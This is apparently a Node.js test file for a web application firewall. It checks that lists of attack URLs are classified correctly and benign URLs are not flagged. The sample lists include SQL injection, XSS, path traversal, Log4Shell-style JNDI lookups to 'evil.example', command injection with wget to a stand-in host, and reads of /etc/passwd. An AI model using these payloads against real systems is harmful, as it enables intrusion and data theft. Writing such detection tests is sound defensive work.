'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('path');
const fs = require('fs');
const os = require('os');

process.env.DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'wm-waf-'));
process.env.AGENT_TOKEN_DASHBOARD = 'a'.repeat(40);
process.env.AGENT_TOKEN_WORKER = 'b'.repeat(40);
process.env.TEMPLATES_DIR = path.join(__dirname, '..', '..', 'templates');

const waf = require('../src/waf');

const ATTACKS = {
  sqli: [
    '/?id=1+UNION+SELECT+username,password+FROM+users',
    '/?id=1%20union%20all%20select%20null,null',
    "/?q=' OR '1'='1",
    '/?q=%27%20or%201%3D1--',
    '/item?id=5 or 1=1',
    '/?id=1;DROP TABLE users',
    '/?id=1+AND+SLEEP(5)',
    '/?x=1%20and%20benchmark%281000000,md5(1)%29',
    '/?t=information_schema.tables',
    '/?id=1/**/union/**/select/**/1',
    '/?q=select%20*%20from%20users',
  ],
  xss: [
    '/?q=<script>alert(1)</script>',
    '/?q=%3Cscript%3Ealert(1)%3C/script%3E',
    '/?q=%3c%20script',
    '/?a="><img src=x onerror=alert(1)>',
    '/?u=javascript:alert(1)',
    '/?u=JaVaScRiPt%3Aalert(1)',
    '/?x=document.cookie',
    '/?x=<svg/onload=alert(1)>',
  ],
  traversal: [
    '/download?file=../../etc/passwd',
    '/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '/a/..%5c..%5cwindows/system32',
    '/?page=php://filter/convert.base64-encode/resource=index',
    '/?page=file:///etc/hosts',
    '/?f=/proc/self/environ',
  ],
  rce: [
    '/?x=${jndi:ldap://evil.example/a}',
    '/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%7D',
    '/?cmd=;cat /tmp/x',
    '/?ip=1.1.1.1|whoami',
    '/?ip=1.1.1.1%3Bwget%20http://evil/x',
    '/?x=/bin/bash -c id',
    '/?x=cmd.exe /c dir',
  ],
  probe: [
    '/.env',
    '/.git/config',
    '/wp-config.php',
    '/backup.sql',
    '/phpmyadmin/index.php',
    '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/phpinfo.php',
    '/composer.json',
    '/cgi-bin/test.cgi',
  ],
};

const BENIGN = [
  '/', '/index.html', '/blog/union-select-the-best-tools', '/shop?category=shoes&sort=price&page=2',
  '/search?q=select+a+gift+for+mom', '/search?q=how+to+union+members+at+work', '/api/v1/users/42?include=posts,comments',
  '/products/orange-and-black-shirts', '/?utm_source=newsletter&utm_medium=email&utm_campaign=sale-2026',
  '/contact?name=Mueller&message=Hello%20World', '/images/photo.jpg?w=300&h=200', '/assets/app.js?v=3f9a1c2b',
  '/de/ueber-uns/team', '/category/script-writing-tips', '/docs/javascript-guide', '/files/report-2026.pdf',
  '/?redirect=/account/settings', '/?id=5;', '/news/2026/10/11/sleep-better-tonight', '/search?q=or+and+nothing',
  '/sitemap.xml', '/robots.txt', '/.well-known/acme-challenge/abc123', '/wp-admin/admin-ajax.php?action=heartbeat',
  '/?q=' + encodeURIComponent('Tom & Jerry'), '/?lang=de&currency=eur', '/produkt/etc-passwd-hosting',
];

for (const [cat, samples] of Object.entries(ATTACKS)) {
  test(`${cat}: attack samples are recognised`, () => {
    for (const s of samples) assert.equal(waf.classify(s), cat, `expected ${cat} for ${s} but got "${waf.classify(s)}"`);
  });
}

test('normal requests are never flagged', () => {
  for (const s of BENIGN) assert.equal(waf.classify(s, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/154.0'), '', `false positive: ${s}`);
});

test('scanner user agents are recognised, ordinary clients are not', () => {
  assert.equal(waf.classify('/', 'sqlmap/1.7.2#stable (https://sqlmap.org)'), 'scanner');
  assert.equal(waf.classify('/', 'Mozilla/5.00 (Nikto/2.1.6)'), 'scanner');
  assert.equal(waf.classify('/', 'curl/8.4.0'), '');
  assert.equal(waf.classify('/', 'Googlebot/2.1 (+http://www.google.com/bot.html)'), '');
  assert.equal(waf.classify('/', ''), '');
});

test('generated nginx rules avoid the escape sequences nginx would rewrite', () => {
  const rules = waf.renderRules();
  const mapLines = rules.split('\n').filter((l) => l.trim().startsWith('"~*'));
  assert.ok(mapLines.length >= 6);
  for (const l of mapLines) {
    assert.doesNotMatch(l, /\[trn"\]/, `ambiguous escape in: ${l.slice(0, 80)}`);
    assert.equal((l.match(/"/g) || []).length, 2, 'exactly the two quotes around the pattern');
  }
  assert.match(rules, /log_format wm_waf /);
  assert.doesNotMatch(rules, /\{\{/);
});

test('per-site variables reflect categories and exempt paths', () => {
  const a = waf.renderSiteVars('site-003', ['sqli', 'xss', 'bogus'], []);
  assert.equal(a.varName, 'wm_waf_site_003');
  assert.match(a.block, /sqli 1;/);
  assert.match(a.block, /xss 1;/);
  assert.doesNotMatch(a.block, /bogus|rce 1/);
  const b = waf.renderSiteVars('site-003', ['sqli'], ['/admin/', '/wp-json/']);
  assert.equal(b.varName, 'wm_waf_hit_site_003');
  assert.match(b.block, /"~\^\/admin\/" 1;/);
  assert.match(b.block, /"10" 1;/);
});

test('long runs of separators do not make the patterns slow (bounded backtracking)', () => {
  const inputs = [
    '/?a=select' + '+'.repeat(7000),
    '/?a=select' + '%20'.repeat(2500),
    '/?a=select' + '/**/'.repeat(1500),
    '/?a=select' + ' x'.repeat(3500),
    "/?a='" + ' '.repeat(7000),
    '/?a=' + 'or%20'.repeat(1500) + "'",
    '/?a=union' + '+'.repeat(7000),
  ];
  for (const input of inputs) {
    const start = process.hrtime.bigint();
    waf.classify(input);
    const ms = Number(process.hrtime.bigint() - start) / 1e6;
    assert.ok(ms < 500, `${input.slice(0, 20)}… (${input.length} characters) took ${ms.toFixed(0)} ms`);
  }
});

test('a separator run within the bound is still recognised', () => {
  assert.equal(waf.classify('/?id=1%20union' + '%20'.repeat(30) + 'select%20null'), 'sqli');
  assert.equal(waf.classify('/?id=1+union' + '+'.repeat(30) + 'select+null'), 'sqli');
});
